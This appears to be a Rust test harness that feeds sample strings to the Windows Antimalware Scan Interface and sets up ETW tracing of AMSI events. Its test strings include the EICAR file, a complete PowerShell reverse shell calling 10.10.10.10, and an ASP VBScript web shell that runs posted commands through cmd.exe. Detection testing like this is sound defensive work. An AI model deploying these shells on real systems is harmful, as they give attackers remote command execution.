use std::io::Read;
use std::{env, fs};
use windows::core::{GUID, PCWSTR, PSTR};
use windows::Win32::Foundation;
use windows::Win32::System::Antimalware;
use windows::Win32::System::Diagnostics::Etw::{self, EVENT_TRACE_NO_PER_PROCESSOR_BUFFERING};
fn main() {
    let mut args = env::args();
    let filename = args.nth(1).expect("No filename given to analyze");

    match fs::File::open(filename.as_str()) {
        Ok(mut file) => {
            let mut buf: Vec<u8> = Vec::new();
            file.read_to_end(&mut buf).unwrap();
            dbg!(buf);
        }
        Err(_) => {
            dbg!("Failed to open file");
        }
    }

    dbg!(filename);

    unsafe {
        let appname_raw: Vec<u16> = "scanni".encode_utf16().chain(std::iter::once(0)).collect();
        let appname = PCWSTR(appname_raw.as_ptr());
        let eicar: Vec<u16> =
            r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

        let webshell: Vec<u16> =
            r#"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"#
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

        let good: Vec<u16> = r"testing123"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let vbs: Vec<u16> = r#"
            Dim oScript
            Dim oScriptNet
            Dim oFileSys, oFile
            Dim szCMD, szTempFile
        
            On Error Resume Next
        
            ' -- create the COM objects that we will be using -- '
            Set oScript = Server.CreateObject("WSCRIPT.SHELL")
            Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
            Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
        
            ' -- check for a command that we have posted -- '
            szCMD = Request.Form(".CMD")
            If (szCMD <> "") Then
        
            ' -- Use a poor man's pipe ... a temp file -- '
            szTempFile = "C:\" & oFileSys.GetTempName( )
            Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
            Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
        
            End If"#
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let tests = vec![&eicar, &webshell, &good, &vbs];

        let mut tracehandle = Etw::CONTROLTRACE_HANDLE { Value: 0 };
        let mut properties: Etw::EVENT_TRACE_PROPERTIES = TraceProps::default().into();

        let err = Etw::StartTraceW(&mut tracehandle, appname, &mut properties);

        match err {
            Foundation::ERROR_SUCCESS => {
                dbg!("StartTraceA initialized successfully!", tracehandle);
            }
            Foundation::ERROR_ALREADY_EXISTS => {
                dbg!("Trace already exists!");
            }
            _ => {
                dbg!("AHHH unexpected error in ETW", err);
            }
        }

        // Microsoft-Antimalware-Scan-Interface - {2A576B87-09A7-520E-C21A-4942F0271D67}
        // (https://docs.velociraptor.app/exchange/artifacts/pages/amsi/)
        let amsi_guid: GUID = "2A576B87-09A7-520E-C21A-4942F0271D67".into();
        let err = Etw::EnableTraceEx2(
            tracehandle,
            &amsi_guid,
            Etw::EVENT_CONTROL_CODE_ENABLE_PROVIDER.0,
            Etw::TRACE_LEVEL_INFORMATION as u8,
            0,
            0,
            0,
            None,
        );

        match err {
            Foundation::ERROR_SUCCESS => {
                dbg!("EnableTraceEx2 initialized successfully!", tracehandle);
            }
            _ => {
                dbg!("AHHH unexpected error in EnableTraceEx2", err);
            }
        }

        let mut trace_log: Etw::EVENT_TRACE_LOGFILEA = TraceLogFile::new().into();

        let trace_proc_handle = Etw::OpenTraceA(&mut trace_log);

        // if trace_proc_handle.Value == Foundation::INVALID_HANDLE_VALUE.0 as u64 {
        //     dbg!("OpenTraceA failed to init, probably wrong args");
        // }

        let context = Antimalware::AmsiInitialize(appname).unwrap();

        let session = Antimalware::AmsiOpenSession(context).unwrap();

        for test in tests.iter() {
            // TODO Read from ETW

            let result =
                Antimalware::AmsiScanString(context, PCWSTR(test.as_ptr()), appname, session)
                    .unwrap();

            let is_malware = result.0 >= 32768;
            println!("Is Malware? {}", is_malware);
        }

        Etw::StopTraceW(tracehandle, appname, &mut properties);
        Etw::CloseTrace(Etw::PROCESSTRACE_HANDLE {
            Value: tracehandle.Value,
        });
    };

    println!("Hello, AMSI Scanning!");
}

// https://learn.microsoft.com/en-us/windows/win32/api/evntrace/ns-evntrace-event_trace_properties
#[derive(Debug)]
struct TraceProps {
    buffer_size: u32,
    minimum_buffers: u32,
    maximum_buffers: u32,
    flush_timer: u32,
}

// pub struct EVENT_TRACE_LOGFILEA {
//     pub LogFileName: ::windows_core::PSTR,
//     pub LoggerName: ::windows_core::PSTR,
//     pub CurrentTime: i64,
//     pub BuffersRead: u32,
//     pub Anonymous1: EVENT_TRACE_LOGFILEA_0,
//     pub CurrentEvent: EVENT_TRACE,
//     pub LogfileHeader: TRACE_LOGFILE_HEADER,
//     pub BufferCallback: PEVENT_TRACE_BUFFER_CALLBACKA,
//     pub BufferSize: u32,
//     pub Filled: u32,
//     pub EventsLost: u32,
//     pub Anonymous2: EVENT_TRACE_LOGFILEA_1,
//     pub IsKernelTrace: u32,
//     pub Context: *mut ::core::ffi::c_void,
// }

struct TraceLogFile<'a> {
    _logger_name: &'a str,
}

impl<'a> From<TraceLogFile<'a>> for Etw::EVENT_TRACE_LOGFILEA {
    fn from(_trace_log_file: TraceLogFile) -> Self {
        let a_1 = Etw::EVENT_TRACE_LOGFILEA_0 {
            ProcessTraceMode: Etw::PROCESS_TRACE_MODE_EVENT_RECORD,
        };
        Etw::EVENT_TRACE_LOGFILEA {
            Anonymous1: a_1,
            LoggerName: PSTR("scanni".to_string().as_mut_ptr()),
            ..Default::default()
        }
    }
}

impl TraceLogFile<'_> {
    pub fn new() -> Self {
        Self {
            _logger_name: "scanni",
        }
    }
}

impl Default for TraceLogFile<'_> {
    fn default() -> Self {
        TraceLogFile {
            _logger_name: "scanni",
        }
    }
}

impl Default for TraceProps {
    fn default() -> Self {
        TraceProps {
            buffer_size: 32,
            minimum_buffers: 0,
            maximum_buffers: 0,
            flush_timer: 1,
        }
    }
}

impl From<TraceProps> for Etw::EVENT_TRACE_PROPERTIES {
    fn from(trace_props: TraceProps) -> Self {
        let wnode = Etw::WNODE_HEADER {
            BufferSize: 1024 as u32,
            ..Default::default()
        };

        Etw::EVENT_TRACE_PROPERTIES {
            Wnode: wnode,
            BufferSize: trace_props.buffer_size,
            MinimumBuffers: trace_props.minimum_buffers,
            MaximumBuffers: trace_props.maximum_buffers,
            FlushTimer: trace_props.flush_timer,
            LogFileMode: (Etw::EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_NO_PER_PROCESSOR_BUFFERING),
            ..Default::default()
        }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn vbs() {
        assert_eq!(true, true);
    }
}